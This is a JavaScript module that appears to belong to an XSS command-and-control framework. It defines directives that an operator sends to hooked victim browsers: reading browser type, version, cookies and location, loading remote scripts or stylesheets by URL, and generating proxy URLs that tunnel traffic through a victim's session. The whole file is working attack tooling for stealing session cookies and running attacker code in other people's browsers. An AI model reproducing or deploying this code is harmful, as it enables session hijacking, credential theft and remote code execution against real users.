import { sockets } from '../xss-core';
import { proxy_port_local, proxy_domain } from '../conf';
import { generateNewLog } from '../utils';

export const directives = [{
    directive : '/get/browser/version',
    payload : 'window.cachex.utils.getBrwVersion()'
},{
    directive : '/get/browser/type',
    payload : 'window.cachex.utils.getBrw()'
},{
    directive : '/get/cookie',
    payload : 'window.cachex.utils.getCookie()'
},{
    directive : '/get/location',
    payload : 'window.cachex.utils.getLocation()'
},{
    directive : '/load/js',
    payload : args => {
        return `document.body.appendChild(document.createElement('script')).src='${args[0]}'`;
    }
},{
    directive : '/load/css',
    payload : args => {
        return `var d=document.createElement('link');d.rel='stylesheet';d.href='${args[0]}';document.head.appendChild(d);`;
    }
},{
    directive : '/generate/proxy_url',
    payload : (id, args) => {
        const session = sockets[id];
        try{
            const url = new URL(args[0]);
            const port = url.port || (function(){
                switch(url.protocol){
                    case 'http:': return 80;
                    case 'https:': return 443;
                    case 'ftp:': return 21;
                    case 'ssh:': return 22;
                }
            })();
            const proxy_url = `代理url为：${url.protocol.substr(0, url.protocol.length - 1)}.${port}.` + 
                `${url.hostname}.${session.server_name}.${proxy_domain()}:${proxy_port_local()}` + 
                `${url.pathname === '/' ? '' : url.pathname}/${url.search}`;
            session.addNewLog(generateNewLog('PROXY', proxy_url, 'white'));
        }catch(e){
            session.addNewLog(generateNewLog('PROXY', e, 'white'));
        }
    }
}];